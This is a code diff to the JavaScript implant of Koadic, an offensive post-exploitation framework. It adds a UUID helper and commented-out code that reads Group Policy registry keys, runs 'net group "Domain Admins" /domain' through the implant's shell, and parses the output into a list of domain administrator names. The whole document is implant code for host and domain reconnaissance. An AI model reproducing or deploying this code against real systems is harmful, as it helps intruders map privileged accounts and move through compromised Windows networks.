@@ -106,6 +106,22 @@ Koadic.isWScript = function()
     return typeof(WScript) !== "undefined";
 }
 
+Koadic.uuid = function()
+{
+    try
+    {
+        function s4()
+        {
+            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
+        }
+        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
+            s4() + '-' + s4() + s4() + s4();
+    }
+    catch(e)
+    {
+    }
+}
+
 Koadic.user = {};
 
 Koadic.user.isElevated = function()
@@ -143,7 +159,11 @@ Koadic.user.DC = function()
     {
         var DC = Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
         if (DC.length > 0)
-          return DC;
+        {
+            //DC += "___" + Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
+            //DC += Koadic.user.ParseDomainAdmins(Koadic.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
+            return DC;
+        }
     }
     catch(e)
     {
@@ -151,6 +171,33 @@ Koadic.user.DC = function()
     return "Unknown";
 
 }
+
+/*Koadic.user.ParseDomainAdmins = function(results)
+{
+    try
+    {
+        var domain = results.split("domain controller for domain ")[1].split(".\r\n")[0];
+        var retstring = "___" + domain;
+        var parse1 = results.split("-------\r\n")[1].split("The command completed successfully.")[0];
+        var parse2 = parse1.split("\r\n");
+        var tmp = [];
+        for(var i = 0; i < parse2.length; i++)
+        {
+            tmp = parse2[i].split(" ");
+            for(var j = 0; j < tmp.length; j++)
+            {
+                if(tmp[j])
+                {
+                    retstring += "___" + tmp[j].toLowerCase();
+                }
+            }
+        }
+    }
+    catch(e)
+    {
+    }
+    return retstring;
+}*/
 
 Koadic.user.Arch = function()
 {
